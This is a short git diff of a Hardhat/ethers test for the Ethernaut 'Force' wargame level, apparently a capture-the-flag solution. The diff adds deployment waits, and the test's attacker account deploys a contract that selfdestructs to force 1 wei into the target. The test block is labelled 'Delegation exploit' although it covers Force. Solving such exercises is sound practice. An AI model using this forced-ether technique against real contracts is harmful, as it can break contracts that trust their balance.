@@ -6,6 +6,7 @@ describe("Delegation exploit", () => {
     const [deployer, attacker] = await ethers.getSigners();
     const ForceFactory = await ethers.getContractFactory("ForceFactory");
     const forceFactory = await ForceFactory.connect(deployer).deploy();
+    await forceFactory.deployed();
 
     // Simulate execution of createInstance to get return value of the function(address of deployed instance)
     const forceFactoryAddress = await forceFactory.connect(attacker).callStatic.createInstance(attacker.address);
@@ -20,9 +21,10 @@ describe("Delegation exploit", () => {
 
     // Deploy the ForceHack contract.
     // "selfdestruct" function in the constructor will send ether stored in the contract to the supplied address.
-    await ForceHack.connect(attacker).deploy(force.address, {
+    const forceHack = await ForceHack.connect(attacker).deploy(force.address, {
       value: ethers.utils.parseUnits("1", "wei"),
     });
+    await forceHack.deployed();
 
     // Validate the instance using Ethernaut validation.
     const success = await forceFactory.connect(attacker).validateInstance(force.address, attacker.address);
